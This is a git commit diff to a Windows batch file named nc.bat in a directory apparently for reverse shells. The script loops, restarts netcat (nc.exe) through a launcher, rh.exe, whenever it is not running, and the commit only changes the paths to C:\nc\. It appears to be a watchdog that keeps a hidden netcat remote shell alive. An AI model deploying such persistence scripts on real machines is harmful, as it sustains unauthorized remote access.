79fcaf07f99f37956a2b187e4a684cbedda5beb0
7ext 34 <55564552+7ext34@users.noreply.github.com>
2019-10-02 21:44:52 -0400

    Update nc.bat

--- RevSh/Windows10/nc.bat
+++ RevSh/Windows10/nc.bat
@@ -4,7 +4,7 @@ cls
 taskkill /f /fi "status eq not responding"
 timeout 15
 tasklist /FI "IMAGENAME eq nc.exe" 2>NUL | find /I /N "nc.exe">NUL
-if NOT "%ERRORLEVEL%" == "0" start rh.exe nc_run.bat
+if NOT "%ERRORLEVEL%" == "0" start C:\nc\rh.exe C:\nc\nc_run.bat
 if errorlevel 0 (
         goto loop
 )
